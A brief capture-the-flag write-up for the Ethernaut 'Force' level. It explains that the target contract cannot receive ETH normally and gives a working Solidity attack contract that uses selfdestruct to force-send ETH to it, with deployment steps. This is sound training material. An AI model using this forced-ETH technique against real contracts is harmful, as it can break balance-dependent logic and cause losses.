# Ethernaut Force Level Attack

## Goal

Make the balance of the contract greater than zero

---

## Vulnerable Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```

## Root cause
As the `Force` contract has no `receive()` or payable `fallback()` function, the trick is to use `selfdestruct`, which can force-send ETH to any address.

## Attack contract 
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackForce {
    constructor(address payable _forceAddress) payable {
        selfdestruct(_forceAddress);
    }
}
```

## Attack plan

Step 1: Copy the `Force` address from Ethernaut

Step 2: Deploy `AttackForce`

Step 3: Pass the `Force` address into the contructor.

Step 4: Set Value to something greater than 0.

Step 5: Deploy. Check the balance to see the value > 0:
```javascript
await getBalance(contract.address)
```